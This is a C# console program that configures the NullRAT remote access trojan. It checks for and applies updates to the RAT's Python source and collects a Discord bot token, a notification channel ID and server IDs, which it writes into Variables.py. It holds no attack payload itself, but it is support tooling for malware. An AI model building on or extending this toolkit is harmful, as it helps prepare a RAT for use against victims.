using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using Nulllib;
using Spectre.Console;

namespace NullRAT.Variables;
public static class MainActivity
{
    public static async Task Main()
    {
        #region Variables
        StringBuilder token = new();
        StringBuilder notif_cnn_id = new();
        StringBuilder serverIDCollection = new();
        RATVariables nullRATVars = new();


        // Store some response data for the updater 
        Updater updater = new();
        // ---------

        Unmanaged.LockConsoleSizeXY(); // Lock console

        #endregion
        #region Presentation v2.0

        Console.Title = "NullRAT Variables";
        Console.Clear();
        Console.WriteLine();
        Utilities.PrintNullRAT();

        AnsiConsole.Write(new Rule("[maroon]NullRAT Variables[/]").LeftAligned());

        #endregion
        #region Verify src is present.
        if (!Directory.Exists(Environment.CurrentDirectory + "\\src\\"))
        {
            Console.WriteLine("\nThere isn't a valid NullRAT source folder, Exiting...");
            Thread.Sleep(2000);
            Environment.Exit(-1);
        }
        #endregion

        #region Check Updates and for a past Variables.py
        Task<bool> ratUpdateChecker = Task.Run(() => updater.CheckUpdate());

        AnsiConsole.Status().Start("Checking for RAT.py Updates", ctx =>
        {
            ctx.Spinner(Spinner.Known.Ascii).SpinnerStyle?.Decoration(Decoration.Dim);
            while (!ratUpdateChecker.IsCompleted)
            {
                Thread.Sleep(50);
                if (ratUpdateChecker.IsCompleted)
                {
                    InstanceData.UpdateAvailable = ratUpdateChecker.Result;
                }
            }
        });

        if (InstanceData.UpdateAvailable)
        {
            Console.WriteLine();
            Nulllib.Text.SlowPrintI("There has been an update in NullRAT's source, do you want to apply it? ", "green", false);

            if (AnsiConsole.Confirm("", true))
            {
                Thread.Sleep(750);
                // Write RAT.py source.
                try
                {
                    CancellationTokenSource tokenCanceller = new();
                    AnsiConsole.Markup("");
                    await WriteFile.WriteRAT(updater);
                    Nulllib.Text.SlowPrintI("Update applied successfully!", "green", false);
                }
                catch (Exception ex)
                {
                    Nulllib.Text.SlowPrintE("Failed to apply the update!", "maroon", false);
#if DEBUG
                    Console.WriteLine($"EXCEPTION -> {ex}");
#endif
                }
                Console.WriteLine();
            }
        }
        // Proces variables.
        if (File.Exists(Environment.CurrentDirectory + "/src/Variables.py"))
        {
            await VariableParser.ProcessVariablesPy();
        }

        #endregion

        #region Get Bot_Token, Notification Channel ID and Server ID
        if (!InstanceData.UpdateAvailable)
            Console.WriteLine();

        bool success = false;
        while (!success)
        {
            success = VariablesPY.GetToken(ref nullRATVars);
        }

        success = false;
        while (!success)
        {
            success = VariablesPY.GetNotificationId(ref nullRATVars);
        }

        success = false;
        while (!success)
        {
            success = VariablesPY.GetServerIDs(ref nullRATVars); // If true break out of the loop, else continue
        }
        #endregion
        #region Save Variables To Variables.py

        Task saveVars = Task.Run(async () => await WriteFile.WriteVariables(nullRATVars));

        AnsiConsole.Status().Start("Saving Variables",
            ctx =>
            {
                ctx.Spinner(Spinner.Known.Ascii).SpinnerStyle?.Decoration(Decoration.Dim);
                while (!saveVars.IsCompleted)
                {
                    Thread.Sleep(420);
                }
            });
        #endregion

        #region Exit.
        EndExecution();
        #endregion
    }
    public static void EndExecution()
    {
        const int dotWaitTime = 1666;
        #region Say Goodbye!
        AnsiConsole.Markup("[yellow bold]Exiting in 5 seconds[/]");

        for (int i = 0; i < 3; i++)
        {
            Thread.Sleep(dotWaitTime);
            AnsiConsole.Markup("[yellow bold].[/]");
        }
        Environment.Exit(0);
        #endregion
    }
}